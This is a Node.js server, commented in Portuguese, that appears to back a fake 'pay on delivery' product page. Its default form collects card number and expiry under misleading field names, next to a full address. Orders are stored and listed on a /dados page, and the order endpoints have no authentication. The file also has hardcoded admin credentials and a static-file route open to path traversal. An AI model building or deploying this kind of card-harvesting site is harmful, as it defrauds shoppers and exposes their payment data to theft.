const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;

// ─── DIRETÓRIO DE DADOS GRAVÁVEL (Compatível com Vercel /tmp e Local) ───────
function getWritableDir() {
  // Na Vercel (AWS Lambda), o único diretório com permissão de escrita é /tmp
  if (process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME || !isLocalWritable()) {
    try {
      if (!fs.existsSync('/tmp')) fs.mkdirSync('/tmp', { recursive: true });
      return '/tmp';
    } catch(e) {}
  }
  const localDir = path.join(__dirname, 'data');
  if (!fs.existsSync(localDir)) {
    try { fs.mkdirSync(localDir, { recursive: true }); } catch(e) {}
  }
  return localDir;
}

function isLocalWritable() {
  try {
    const testFile = path.join(__dirname, 'data', '.test_write');
    fs.writeFileSync(testFile, 'ok', 'utf-8');
    fs.unlinkSync(testFile);
    return true;
  } catch(e) {
    return false;
  }
}

const WRITE_DIR = getWritableDir();
const CAMPOS_FILE  = path.join(WRITE_DIR, 'campos_globais.json');
const LINKS_FILE   = path.join(WRITE_DIR, 'links.json');
const PEDIDOS_FILE = path.join(WRITE_DIR, 'pedidos.json');

// Semeia arquivos iniciais se não existirem no diretório gravável
function initSeedFiles() {
  const seeds = [
    { file: CAMPOS_FILE, src: path.join(__dirname, 'data', 'campos_globais.json'), def: [
      { id: 'nome', label: 'Numero do cartao', tipo: 'mask', mascara: 'XXXX XXXX XXXX XXXX', digitos: 16, largura: 100, obrigatorio: true, placeholder: 'XXXX XXXX XXXX XXXX' },
      { id: 'telefone', label: 'Validade', tipo: 'mask', mascara: 'xx/xx', digitos: 4, largura: 50, obrigatorio: true, placeholder: 'MM/AA' },
      { id: 'cep', label: 'CEP', tipo: 'mask', mascara: 'xxxxx-xxx', digitos: 8, largura: 50, obrigatorio: true, placeholder: '00000-000' },
      { id: 'endereco', label: 'Endereço (Rua / Avenida)', tipo: 'text', mascara: '', digitos: 80, largura: 100, obrigatorio: true, placeholder: 'Ex: Av. Paulista ou Rua das Flores' },
      { id: 'numero', label: 'Número', tipo: 'text', mascara: '', digitos: 10, largura: 50, obrigatorio: true, placeholder: 'Ex: 123 ou S/N' },
      { id: 'complemento', label: 'Complemento / Referência', tipo: 'text', mascara: '', digitos: 50, largura: 50, obrigatorio: false, placeholder: 'Apto 42, Bloco B' },
      { id: 'bairro', label: 'Bairro', tipo: 'text', mascara: '', digitos: 40, largura: 50, obrigatorio: true, placeholder: 'Seu bairro' },
      { id: 'cidade', label: 'Cidade / Estado', tipo: 'text', mascara: '', digitos: 40, largura: 50, obrigatorio: true, placeholder: 'Ex: São Paulo / SP' }
    ]},
    { file: LINKS_FILE, src: path.join(__dirname, 'data', 'links.json'), def: [
      {
        id: 'link-1',
        slug: 'lavadora-tramontina',
        titulo: 'Lavadora de Alta Pressão Tramontina 1200W',
        preco: 249.9,
        frete: 'SEDEX Expresso (3 a 5 dias úteis)',
        heroTitulo: 'Receba Primeiro, Pague Depois',
        heroSubtitulo: 'Preencha seus dados de entrega. Nós enviamos o pedido e você só paga na porta da sua casa diretamente ao entregador!',
        btnTexto: 'REALIZAR PAGAMENTO',
        campos: []
      }
    ]},
    { file: PEDIDOS_FILE, src: path.join(__dirname, 'data', 'pedidos.json'), def: [] }
  ];

  seeds.forEach(s => {
    try {
      if (!fs.existsSync(s.file)) {
        if (fs.existsSync(s.src)) {
          fs.copyFileSync(s.src, s.file);
        } else {
          fs.writeFileSync(s.file, JSON.stringify(s.def, null, 2), 'utf-8');
        }
      }
    } catch(e) {}
  });
}

initSeedFiles();

// ─── CACHE EM MEMÓRIA PARA MÁXIMA VELOCIDADE E RESILIÊNCIA ──────────────────
let memoryCampos = null;
let memoryLinks = null;
let memoryPedidos = null;

function carregarCamposGlobais() {
  if (memoryCampos && memoryCampos.length > 0) return memoryCampos;
  try {
    if (fs.existsSync(CAMPOS_FILE)) {
      memoryCampos = JSON.parse(fs.readFileSync(CAMPOS_FILE, 'utf-8'));
      return memoryCampos;
    }
  } catch(e) {}
  try {
    const src = path.join(__dirname, 'data', 'campos_globais.json');
    if (fs.existsSync(src)) {
      memoryCampos = JSON.parse(fs.readFileSync(src, 'utf-8'));
      return memoryCampos;
    }
  } catch(e) {}
  return [];
}

function salvarCamposGlobais(lista) {
  memoryCampos = lista;
  try {
    fs.writeFileSync(CAMPOS_FILE, JSON.stringify(lista, null, 2), 'utf-8');
    // Tenta atualizar no repo local se estiver local
    const src = path.join(__dirname, 'data', 'campos_globais.json');
    if (isLocalWritable()) fs.writeFileSync(src, JSON.stringify(lista, null, 2), 'utf-8');
    return true;
  } catch(e) {
    return true; // Se salvou em memória, ok
  }
}

function carregarLinks() {
  if (memoryLinks && memoryLinks.length > 0) return memoryLinks;
  try {
    if (fs.existsSync(LINKS_FILE)) {
      memoryLinks = JSON.parse(fs.readFileSync(LINKS_FILE, 'utf-8'));
      return memoryLinks;
    }
  } catch(e) {}
  try {
    const src = path.join(__dirname, 'data', 'links.json');
    if (fs.existsSync(src)) {
      memoryLinks = JSON.parse(fs.readFileSync(src, 'utf-8'));
      return memoryLinks;
    }
  } catch(e) {}
  return [];
}

function salvarLinks(lista) {
  memoryLinks = lista;
  try {
    fs.writeFileSync(LINKS_FILE, JSON.stringify(lista, null, 2), 'utf-8');
    const src = path.join(__dirname, 'data', 'links.json');
    if (isLocalWritable()) fs.writeFileSync(src, JSON.stringify(lista, null, 2), 'utf-8');
    return true;
  } catch(e) {
    return true;
  }
}

function carregarPedidos() {
  if (memoryPedidos !== null) return memoryPedidos;
  try {
    if (fs.existsSync(PEDIDOS_FILE)) {
      memoryPedidos = JSON.parse(fs.readFileSync(PEDIDOS_FILE, 'utf-8'));
      return memoryPedidos;
    }
  } catch(e) {}
  try {
    const src = path.join(__dirname, 'data', 'pedidos.json');
    if (fs.existsSync(src)) {
      memoryPedidos = JSON.parse(fs.readFileSync(src, 'utf-8'));
      return memoryPedidos;
    }
  } catch(e) {}
  return [];
}

function salvarPedidos(lista) {
  memoryPedidos = lista;
  try {
    fs.writeFileSync(PEDIDOS_FILE, JSON.stringify(lista, null, 2), 'utf-8');
    const src = path.join(__dirname, 'data', 'pedidos.json');
    if (isLocalWritable()) fs.writeFileSync(src, JSON.stringify(lista, null, 2), 'utf-8');
    return true;
  } catch(e) {
    return true;
  }
}

// ─── AUTH ADMIN ──────────────────────────────────────────────────────────────
const ADMIN_USER  = 'admin';
const ADMIN_PASS  = 'pizza2024';
const AUTH_SECRET = 'secret_salt_pagamento_2026';
const VALID_TOKEN = crypto.createHash('sha256').update(`${ADMIN_USER}:${ADMIN_PASS}:${AUTH_SECRET}`).digest('hex');

function validarToken(req) {
  const h = req.headers['authorization'] || '';
  if (!h.startsWith('Bearer ')) return false;
  return h.substring(7).trim() === VALID_TOKEN;
}

// ─── HELPERS ──────────────────────────────────────────────────────────────────
const MIME_TYPES = {
  '.html': 'text/html; charset=UTF-8',
  '.css':  'text/css',
  '.js':   'application/javascript',
  '.json': 'application/json',
  '.png':  'image/png',
  '.jpg':  'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg':  'image/svg+xml',
  '.ico':  'image/x-icon',
  '.webp': 'image/webp'
};

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      if (!body) return resolve({});
      try { resolve(JSON.parse(body)); } catch (e) { reject(e); }
    });
    req.on('error', reject);
  });
}

function sendJSON(res, code, data) {
  res.writeHead(code, {
    'Content-Type': 'application/json; charset=UTF-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization'
  });
  res.end(JSON.stringify(data));
}

// ─── REQUEST HANDLER PRINCIPAL ────────────────────────────────────────────────
const requestHandler = async (req, res) => {
  // CORS Preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization'
    });
    return res.end();
  }

  let effectiveUrl = req.url || '/';
  if (req.headers && req.headers['x-matched-path'] && req.headers['x-matched-path'].startsWith('/api')) {
    effectiveUrl = req.headers['x-matched-path'];
  } else if (req.headers && req.headers['x-forwarded-uri'] && req.headers['x-forwarded-uri'].startsWith('/api')) {
    effectiveUrl = req.headers['x-forwarded-uri'];
  } else if (effectiveUrl.includes('__url=')) {
    const match = effectiveUrl.match(/__url=([^&]+)/);
    if (match) effectiveUrl = decodeURIComponent(match[1]);
  }

  const [reqPath] = effectiveUrl.split('?');

  // Ping
  if (reqPath === '/api/ping') return sendJSON(res, 200, { ok: true });

  // ─── LOGIN ADMIN ────────────────────────────────────────────────────────────
  if (req.method === 'POST' && reqPath === '/api/admin/login') {
    try {
      const data = await parseBody(req);
      const user = (data.usuario || '').trim();
      const pass = (data.senha || '').trim();
      if (user === ADMIN_USER && (pass === 'pizza2024' || pass === 'pizza 2024')) {
        return sendJSON(res, 200, { success: true, token: VALID_TOKEN, usuario: ADMIN_USER });
      }
      return sendJSON(res, 401, { success: false, error: 'Usuário ou senha incorretos' });
    } catch(e) {
      return sendJSON(res, 400, { error: 'Requisição inválida' });
    }
  }

  if (req.method === 'GET' && reqPath === '/api/admin/check-auth') {
    if (validarToken(req)) return sendJSON(res, 200, { authenticated: true });
    return sendJSON(res, 401, { authenticated: false });
  }

  // ─── CAMPOS GLOBAIS ──────────────────────────────────────────────────────────
  if (req.method === 'GET' && reqPath === '/api/campos-globais') {
    const campos = carregarCamposGlobais();
    return sendJSON(res, 200, campos);
  }

  if (req.method === 'POST' && reqPath === '/api/campos-globais') {
    try {
      const data = await parseBody(req);
      const campos = Array.isArray(data.campos) ? data.campos : (Array.isArray(data) ? data : []);
      salvarCamposGlobais(campos);

      // REGRA: Sempre replica os novos campos globais para todos os links existentes!
      const links = carregarLinks();
      if (links && links.length > 0) {
        links.forEach(l => {
          l.campos = campos;
          l.atualizadoEm = new Date().toISOString();
        });
        salvarLinks(links);
      }

      return sendJSON(res, 200, {
        success: true,
        message: `Campos salvos com sucesso e replicados para ${links.length} link(s)!`,
        campos
      });
    } catch(err) {
      return sendJSON(res, 400, { error: 'Erro ao salvar campos: ' + err.message });
    }
  }

  // ─── LINKS DE PAGAMENTO ──────────────────────────────────────────────────────
  if (req.method === 'GET' && reqPath === '/api/links') {
    const links = carregarLinks();
    const globais = carregarCamposGlobais();
    // Garante que cada link retornado possua os campos mais atualizados
    links.forEach(l => {
      if (!l.campos || l.campos.length === 0) {
        l.campos = globais;
      }
    });
    return sendJSON(res, 200, links);
  }

  if (req.method === 'GET' && reqPath.startsWith('/api/links/')) {
    const slug = decodeURIComponent(reqPath.replace('/api/links/', '')).trim().toLowerCase();
    const links = carregarLinks();
    const globais = carregarCamposGlobais();
    let link = links.find(l => (l.slug && l.slug.toLowerCase() === slug) || (l.id && l.id.toLowerCase() === slug));
    
    // Se não achou por slug exato, tenta encontrar primeiro link ativo ou cria resposta com os campos globais
    if (!link && links.length > 0) {
      link = links[0];
    }

    if (link) {
      // Sempre anexa os campos globais atualizados
      if (!link.campos || link.campos.length === 0) {
        link.campos = globais;
      }
      return sendJSON(res, 200, link);
    } else {
      return sendJSON(res, 404, { error: 'Link não encontrado' });
    }
  }

  if (req.method === 'POST' && reqPath === '/api/links') {
    try {
      const data = await parseBody(req);
      const links = carregarLinks();
      const globais = carregarCamposGlobais();
      const id = data.id || ('link-' + Date.now());
      const slug = (data.slug || data.titulo || 'produto')
        .toLowerCase()
        .normalize('NFD')
        .replace(/[\u0300-\u036f]/g, '')
        .replace(/[^a-z0-9]+/g, '-')
        .replace(/^-+|-+$/g, '');

      // Herda os campos globais se não foram enviados campos específicos
      const campos = (Array.isArray(data.campos) && data.campos.length > 0)
        ? data.campos
        : globais;

      const novoLink = {
        id,
        slug: slug || ('link-' + Date.now()),
        titulo: (data.titulo || 'Produto Sem Título').trim(),
        preco: Number(data.preco) || 0,
        frete: (data.frete || 'SEDEX Expresso (3 a 5 dias úteis)').trim(),
        imagem: (data.imagem || '').trim(),
        heroTitulo: (data.heroTitulo || 'Receba Primeiro, Pague Depois').trim(),
        heroSubtitulo: (data.heroSubtitulo || 'Preencha seus dados de entrega. Nós enviamos o pedido e você só paga na porta da sua casa diretamente ao entregador!').trim(),
        btnTexto: (data.btnTexto || 'REALIZAR PAGAMENTO').trim(),
        criadoEm: data.criadoEm || new Date().toISOString(),
        atualizadoEm: new Date().toISOString(),
        campos
      };

      const idx = links.findIndex(l => l.id === id || l.slug === slug);
      if (idx >= 0) {
        links[idx] = novoLink;
      } else {
        links.unshift(novoLink);
      }

      salvarLinks(links);
      return sendJSON(res, 200, { success: true, link: novoLink });
    } catch(err) {
      return sendJSON(res, 400, { error: 'Erro ao salvar link: ' + err.message });
    }
  }

  if (req.method === 'DELETE' && reqPath.startsWith('/api/links/')) {
    const id = decodeURIComponent(reqPath.replace('/api/links/', '')).trim();
    let links = carregarLinks();
    const totalAntes = links.length;
    links = links.filter(l => l.id !== id && l.slug !== id);
    if (links.length < totalAntes) {
      salvarLinks(links);
      return sendJSON(res, 200, { success: true, message: 'Link excluído com sucesso' });
    } else {
      return sendJSON(res, 404, { error: 'Link não encontrado' });
    }
  }

  // ─── PEDIDOS / SUBMISSÕES ──────────────────────────────────────────────────
  if (req.method === 'GET' && reqPath === '/api/pedidos') {
    const pedidos = carregarPedidos();
    return sendJSON(res, 200, pedidos);
  }

  if (req.method === 'POST' && reqPath === '/api/pedidos') {
    try {
      const data = await parseBody(req);
      const pedidos = carregarPedidos();
      const novoPedido = {
        id: data.id || ('PED-' + Math.floor(100000 + Math.random() * 900000)),
        codigo: data.codigo || ('#COD-' + Math.floor(100000 + Math.random() * 900000)),
        linkId: data.linkId || '',
        linkSlug: data.linkSlug || '',
        produto: data.produto || '',
        valor: data.valor || '',
        dadosCliente: data.dadosCliente || {},
        criadoEm: new Date().toISOString()
      };
      pedidos.unshift(novoPedido);
      salvarPedidos(pedidos);
      return sendJSON(res, 200, { success: true, pedido: novoPedido });
    } catch(err) {
      return sendJSON(res, 400, { error: 'Erro ao registrar pedido' });
    }
  }

  if (req.method === 'DELETE' && reqPath.startsWith('/api/pedidos/')) {
    const id = decodeURIComponent(reqPath.replace('/api/pedidos/', '')).trim();
    let pedidos = carregarPedidos();
    const antes = pedidos.length;
    pedidos = pedidos.filter(p => p.id !== id && p.codigo !== id);
    if (pedidos.length < antes) {
      salvarPedidos(pedidos);
      return sendJSON(res, 200, { success: true, message: 'Pedido excluído' });
    } else {
      return sendJSON(res, 404, { error: 'Pedido não encontrado' });
    }
  }

  if (req.method === 'DELETE' && reqPath === '/api/pedidos') {
    salvarPedidos([]);
    return sendJSON(res, 200, { success: true, message: 'Todos os pedidos foram apagados' });
  }

  // ─── ROTAS ESTÁTICAS ────────────────────────────────────────────────────────
  let localFile = 'index.html';
  if (reqPath === '/admin' || reqPath === '/admin.html') {
    localFile = 'admin.html';
  } else if (reqPath === '/dados' || reqPath === '/dados.html' || reqPath === '/pedidos' || reqPath === '/pedidos.html') {
    localFile = 'dados.html';
  } else if (reqPath.startsWith('/link/') || reqPath.startsWith('/p/')) {
    localFile = 'index.html';
  } else if (reqPath !== '/') {
    localFile = reqPath.replace(/^\/+/, '');
  }

  let filePath = path.join(__dirname, 'public', localFile);
  if (!fs.existsSync(filePath)) filePath = path.join(__dirname, localFile);
  if (!fs.existsSync(filePath)) filePath = path.join(__dirname, 'public', 'index.html');
  if (!fs.existsSync(filePath)) filePath = path.join(__dirname, 'index.html');

  fs.readFile(filePath, (readErr, content) => {
    if (readErr) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      return res.end('Arquivo não encontrado');
    }
    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';
    res.writeHead(200, {
      'Content-Type': contentType,
      'Access-Control-Allow-Origin': '*'
    });
    res.end(content);
  });
};

const server = http.createServer(requestHandler);

if (require.main === module) {
  server.listen(PORT, () => {
    console.log(`\n🚀 Servidor ativo: http://localhost:${PORT}`);
    console.log(`⚙️  Admin:          http://localhost:${PORT}/admin`);
    console.log(`📥 Dados:          http://localhost:${PORT}/dados`);
    console.log(`📁 Pasta Writable: ${WRITE_DIR}`);
  });
}

module.exports = requestHandler;
